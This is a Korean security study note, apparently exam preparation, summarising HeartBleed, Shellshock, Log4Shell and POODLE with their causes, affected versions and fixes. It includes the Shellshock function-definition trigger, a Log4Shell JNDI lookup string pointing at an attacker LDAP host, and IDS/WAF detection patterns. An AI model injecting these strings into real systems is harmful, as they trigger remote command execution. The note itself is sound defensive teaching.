---
title: 주요 취약점 (HeartBleed · Shellshock · Log4Shell · POODLE)
domain: 애플리케이션보안
questions: [3-2, 4-1, 5-2, 7-16, 8-14, 15-7, 23-10, 24-12, 26-18, 29-8, 32-7]
tags: [HeartBleed, Shellshock, Log4j, POODLE, CVE, OpenSSL]
---

## CVE 식별자

`CVE-2014-0160` = `CVE` - `발견/공개 연도` - `그 해 일련번호`. MITRE 채번, NVD가 CVSS 점수 부여.
관련: **CWE**(약점 유형 분류), **CVSS**(심각도 0~10점), **CPE**(제품 식별).

## HeartBleed (CVE-2014-0160)

- **OpenSSL** TLS/DTLS **heartbeat 확장**이 요청이 명시한 payload 길이를 검증 없이 응답 버퍼 크기로 사용
- → 서버 메모리를 **최대 64KB씩 반복 열람** → 개인키·세션쿠키·평문 비밀번호 유출
- 영향 버전: **OpenSSL 1.0.1 ~ 1.0.1f**, 1.0.2-beta ~ beta1
- 대응: **1.0.1g 이상 업그레이드** (불가 시 `-DOPENSSL_NO_HEARTBEATS` 재컴파일) + **인증서·개인키 재발급(폐기)** + 사용자 세션·비밀번호 재설정
- 탐지: `content:"|18 03 00|"` (heartbeat, SSLv3) + 비정상적으로 큰 길이 필드 요청

## Shellshock / Bashdoor (CVE-2014-6271)

- **Bash**가 환경변수에 담긴 함수 정의(`() { :;};`) **뒤에 붙은 명령까지 실행**
- CGI(User-Agent, Referer 등)를 통해 원격 명령 실행 → 흔히 리버스 셸
- 대응: Bash 패치, mod_cgi 비활성화, WAF (`() {` 패턴 차단)

## Log4Shell (CVE-2021-44228)

- **Apache Log4j 2**가 로그 메시지의 `${jndi:ldap://공격자/...}` 를 해석해 원격 객체 로드·실행
- 로그로 남는 곳이면 어디서든 트리거 (User-Agent, 검색어, 채팅…)
- 대응: **2.17.1+ 업그레이드**, `JndiLookup` 클래스 제거, 아웃바운드 LDAP/RMI 차단, WAF

## POODLE (CVE-2014-3566)

- 협상을 **SSL 3.0으로 다운그레이드** 후 CBC 패딩 오라클로 암호문 바이트를 1개씩 복호화
- 대응: **SSL 3.0 비활성화**, `TLS_FALLBACK_SCSV`
- 관련 CBC 공격: BEAST, Lucky13

## 공통 대응 원칙

패치 관리(테스트→배포→검증), 가상패치(WAF/IPS), 최신 CVE 모니터링, EOS 소프트웨어 교체.
